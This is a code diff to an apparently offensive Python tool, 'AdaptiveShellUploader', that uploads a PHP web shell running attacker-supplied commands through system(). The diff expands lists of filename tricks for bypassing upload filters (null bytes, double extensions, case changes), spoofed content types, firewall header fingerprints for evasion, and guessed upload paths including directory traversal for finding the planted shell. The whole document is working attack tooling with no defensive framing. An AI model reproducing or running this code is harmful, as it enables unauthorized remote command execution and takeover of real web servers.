@@ -32,14 +32,47 @@ class AdaptiveShellUploader:
         self.proxies = self.load_proxies()
         self.proxy = random.choice(self.proxies) if self.proxies else None
         self.shell_payload = {
-            'php': '<?php echo "SHELL_OK"; system($_GET["cmd"]); ?>',
-            'filename_variants': ['shell.php', 'shell.pHp', 'shell.php5'],
-            'content_types': ['application/x-php', 'image/jpeg']
-        }
+    'php': '<?php echo "SHELL_OK"; system($_GET["cmd"]); ?>',
+    'filename_variants': [
+        'shell.php', 'shell.pHp', 'shell.php5', 'shell.php7', 'shell.php4', 'shell.php3',
+        'shell.phtml', 'shell.phar', 'shell.inc', 'shell.php.inc', 'shell.php.ini',
+        'shell.php.jpeg', 'shell.php.jpg', 'shell.php.png', 'shell.php.gif', 'shell.php.bmp',
+        'shell.php.svg', 'shell.php.webp', 'shell.php.txt', 'shell.php.log',
+        'shell.php.rar', 'shell.php.zip', 'shell.php.tar.gz', 'shell.php.gz',
+        'shell.php.backup', 'shell.back.php', 'shell.old.php', 'shell.new.php',
+        'shell.tmp.php', 'shell.test.php', 'shell.upload.php', 'shell.injected.php',
+        'shell.cgi.php', 'shell.jsp.php', 'shell.asp.php', 'shell.shtml.php',
+        'shell.php;.jpg', 'shell.php%00.jpg', 'shell.php%20', 'shell.php%0a',
+        'shell.PHP', 'shell.pHp3', 'shell.PHp5', 'shell.PHP7', 'shell.Phtml',
+        'shell.fakeextension.jpg', 'shell.php.fake.jpg', 'shell.jpg.php',
+        'shell.png.php', 'shell.php:.jpg', 'shell.php..jpg', 'shell...php',
+        '.shell.php', 'shell1.php', 'shell123.php', 'cmdshell.php', 'reverse_shell.php',
+        'shell.proxy.php', 'access.php', 'admin.php', 'phpinfo.php'
+    ],
+    'content_types': [
+        'application/x-php', 'image/jpeg', 'image/png', 'image/gif', 'image/webp',
+        'application/octet-stream', 'application/x-httpd-php', 'application/x-php-script',
+        'multipart/form-data', 'application/x-www-form-urlencoded',
+        'text/plain', 'text/html', 'text/x-php', 'text/x-shellscript',
+        'application/x-shellscript', 'application/x-perl', 'application/x-cgi',
+        'application/x-executable', 'application/x-binary', 'application/force-download',
+        'application/download', 'application/php', 'text/x-server-parsed-html',
+        'application/x-php5', 'application/x-php7', 'application/x-phtml',
+        'application/vnd.php', 'text/php'
+    ]
+}
         self.waf_indicators = [
-            'X-WAF-Detected', 'CF-RAY', 'X-Sucuri-ID', 'X-Akamai-Transformed', 'X-Distil-CS',
-            'X-Mod-Security', 'X-Powered-By-AspNet', 'X-CDN', 'X-Cache', 'X-Proxy-Cache'
-        ]
+        'X-WAF-Detected', 'CF-RAY', 'X-Sucuri-ID', 'X-Akamai-Transformed', 'X-Distil-CS',
+        'X-Mod-Security', 'X-Powered-By-AspNet', 'X-CDN', 'X-Cache', 'X-Proxy-Cache',
+        'X-Imunify360-Tag', 'Server: cloudflare', 'X-FireEye', 'X-WAF-Block', 'X-Powered-By: WAF',
+        'X-Security-Policy', 'X-Azure-WAF', 'X-Sitelock-ID', 'X-Edge-WAF', 'X-WAF-Response',
+        'WAF-Status', 'X-Wallarm', 'X-StackPath-Protection', 'X-Imperva-ID', 'X-Reblaze-ID',
+        'X-DataDome', 'X-Fortinet', 'X-Radware', 'X-360-WAF', 'X-WAF-Status', 'X-SiteLock',
+        'X-Cache-Status', 'X-Cloud-WAF', 'X-Armor', 'X-Application-Guard', 'X-Kona-Security',
+        'X-WAF-Protection', 'X-Alert', 'X-NAXSI', 'X-WAF-Defense', 'X-Intercepted-By',
+        'X-Shield', 'X-Anti-DDoS', 'X-Threat-Detected', 'X-HackerGuard', 'X-SecureWall',
+        'X-Attack-Detected', 'X-Zenedge', 'X-Varnish-Cache', 'X-Edge-Block'
+      ]
 
     def load_proxies(self):
         try:
@@ -239,8 +272,42 @@ class AdaptiveShellUploader:
 
     def find_shell_path(self, filename):
         guessed_paths = [
-            'uploads/', 'files/', 'images/', 'media/', 'content/', 'public/', 'wp-content/uploads/'
+          'uploads/', 'upload/', 'files/', 'file/', 'images/', 'img/', 'media/', 'docs/', 'documents/',
+          'content/', 'contents/', 'public/', 'static/', 'cdn/', 'assets/', 'asset/', 'data/', 'tmp/', 'temp/',
+          'admin/uploads/', 'admin/files/', 'wp-content/uploads/', 'wp-includes/', 'themes/', 'includes/',
+          'includes/images/', 'wp-content/themes/', 'wp-content/plugins/', 'wordpress/wp-content/uploads/',
+          'site/wp-content/uploads/', 'custom/uploads/', 'core/uploads/', 'resources/views/uploads/',
+          '.hidden/', '.private/', '.uploads/', '.files/', '_uploads/', '__uploads__/', '_files/', '__files__/',
+          'htdocs/uploads/', 'html/uploads/', 'httpdocs/uploads/', 'public_html/uploads/', 'web/uploads/',
+          'site/uploads/', 'website/uploads/', 'server/uploads/', 'app/uploads/', 'application/uploads/',
+          'backup/', 'backups/', 'logs/', 'log/', 'output/', 'export/', 'import/', 'download/', 'downloads/',
+          'cmd/', 'cmds/', 'shells/', 'php-shells/', 'bin/uploads/', 'engine/uploads/', 'store/', 'storage/',
+          '../../uploads/', '../../../uploads/', '../../../../uploads/', '../../../../../../uploads/',
+          '../../files/', '../../../files/', '../../../../files/', '../../../../../../files/',
+          '../../wp-content/uploads/', '../../../wp-content/uploads/',
+          '/var/www/html/uploads/', '/srv/www/site/uploads/', '/home/user/public_html/uploads/',
+          '/usr/share/nginx/html/uploads/', '/opt/lampp/htdocs/uploads/',
+          'media/uploads/', 'media_files/', 'userfiles/', 'user_files/', 'myfiles/', 'my_files/',
+          'custom/uploads/images/', 'admin/uploads/tmp/', 'files/media/', 'backup/uploads/', 'export/files/',
+          'documents/uploaded/', 'docs/uploads/', 'ftp/uploads/', 'ftp/files/', 'mail/uploads/',
+          'user_data/uploads/', 'user_uploads/', 'dump/uploads/', 'dump/files/', 'restore/uploads/',
+          'patch/uploads/', 'dev/uploads/', 'test/uploads/', 'testing/uploads/', 'demo/uploads/',
+          'examples/uploads/', 'samples/uploads/', 'files/examples/', 'versions/uploads/',
+          'images/uploads/', 'images/files/', 'user/images/', 'profile/images/', 'admin/media/',
+          'old/uploads/', 'old_files/', 'archive/uploads/', 'legacy/uploads/',
+          'cgi-bin/uploads/', 'cgi-bin/files/', 'webapp/uploads/', 'framework/uploads/',
+          'logs/files/', 'sys/uploads/', 'sys/files/', 'runtime/uploads/', 'cache/uploads/',
+          'shell/uploads/', 'inject/uploads/', 'scripts/uploads/', 'payloads/uploads/', 'hacked/uploads/',
+          'db/uploads/', 'db_dumps/', 'database/uploads/', 'mysql/uploads/', 'sql/uploads/',
+          'env/uploads/', 'config/uploads/', 'secure/uploads/', 'vault/uploads/', 'private/uploads/',
+          'cloud/uploads/', 'infra/uploads/', 'api/uploads/', 'api/files/', 'json/uploads/', 'xml/uploads/',
+          'misc/uploads/', 'misc/files/', 'lib/uploads/', 'libs/uploads/', 'modules/uploads/',
+          'functions/uploads/', 'php/uploads/', 'python/uploads/', 'cgi/uploads/',
+          'nginx/uploads/', 'apache/uploads/', 'iis/uploads/', 'webserver/uploads/',
+          'platform/uploads/', 'plugin/uploads/', 'themes/uploads/', 'vendor/uploads/',
+          'tools/uploads/', 'exploit/uploads/', 'malware/uploads/', 'webshell/uploads/', 'root/uploads/'
         ]
+
         for path in guessed_paths:
             shell_url = urljoin(self.target_url, path + filename)
             try:
